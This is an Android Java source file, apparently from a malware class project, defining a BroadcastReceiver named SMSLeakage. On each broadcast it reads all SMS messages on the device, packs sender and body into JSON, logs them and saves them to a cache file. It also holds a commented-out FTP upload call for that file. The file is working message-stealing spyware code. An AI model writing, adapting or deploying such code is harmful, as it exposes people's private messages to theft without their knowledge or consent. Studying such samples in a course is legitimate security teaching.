package com.malwareclass.malwareproject;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.io.Writer;

public class SMSLeakage extends BroadcastReceiver{

    private String TAG = "MessageLeakage";


    @Override
    public void onReceive(Context context, Intent intent) {
        Cursor cursor = context.getContentResolver().query(Uri.parse("content://sms"), null, null, null, null);
        //Log.i(TAG,cursor.getCount()+"!");
        if (cursor.moveToFirst()) { // must check the result to prevent exception
            JSONArray arr = new JSONArray();
            do {
                String toJson = "";
                String person = cursor.getString(cursor.getColumnIndex("person"));
                String body = cursor.getString(cursor.getColumnIndex("body"));
                toJson += "{ \"person\":\"" + person + "\", \"body\":\"" + body + "\"}";
                JSONObject jsonOb = null;
                try {
                   jsonOb = new JSONObject(toJson);
                } catch (JSONException e) {
                    e.printStackTrace();
                }
                arr.put(jsonOb);

            } while (cursor.moveToNext());

            Log.i(TAG, arr.toString());
            Writer output = null;
            File file = new File(context.getCacheDir(),"sms.json");
            try {
                output = new BufferedWriter(new FileWriter(file));
                output.write(arr.toString());
                output.close();
                File[] files = new File[1];
                files[0] = file;
                //new FTP(context).upload(files, "sms");
                Log.i(TAG,"Caricati!");
            } catch (IOException e) {
                Log.i(TAG,"Errore!");
                e.printStackTrace();
            }


        }
    }
}
